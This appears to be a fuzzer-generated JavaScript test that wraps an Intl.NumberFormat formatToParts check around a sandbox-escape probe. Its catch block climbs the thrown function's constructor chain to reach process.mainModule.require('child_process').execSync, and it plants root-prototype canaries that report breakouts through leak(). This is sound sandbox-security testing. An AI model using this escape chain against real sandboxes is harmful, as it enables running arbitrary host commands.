try {
    function reduce(parts) {
        throw () => {
            return () => {
            };
        };
        return parts.map(part => part.value).join('');
    }
    function compareFTPtoFormat(locales, options, value) {
        const nf = new Intl.NumberFormat(locales, options);
        assert.sameValue(nf.format(value), reduce(nf.formatToParts(value)), `Expected the same value for value ${ value },
     locales: ${ locales } and options: ${ options }`);
    }
    const num1 = 123456.789;
    const num2 = 0.123;
    compareFTPtoFormat();
    compareFTPtoFormat('pl');
    compareFTPtoFormat(['pl']);
    compareFTPtoFormat([]);
    compareFTPtoFormat(['de'], undefined, 0);
    compareFTPtoFormat(['de'], undefined, -10);
    compareFTPtoFormat(['de'], undefined, 25324234235);
    compareFTPtoFormat(['de'], undefined, num1);
    compareFTPtoFormat(['de'], { style: 'percent' }, num2);
    compareFTPtoFormat(['de'], {
        style: 'currency',
        currency: 'EUR'
    }, num1);
    compareFTPtoFormat(['de'], {
        style: 'currency',
        currency: 'EUR',
        currencyDisplay: 'code'
    }, num1);
    compareFTPtoFormat(['de'], { useGrouping: true }, num1);
    compareFTPtoFormat(['de'], { useGrouping: false }, num1);
    compareFTPtoFormat(['de'], { minimumIntegerDigits: 2 }, num2);
    compareFTPtoFormat(['de'], { minimumFractionDigits: 6 }, num2);
    compareFTPtoFormat(['de'], { maximumFractionDigits: 1 }, num2);
    compareFTPtoFormat(['de'], { maximumSignificantDigits: 3 }, num1);
    compareFTPtoFormat(['de'], { maximumSignificantDigits: 5 }, num1);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}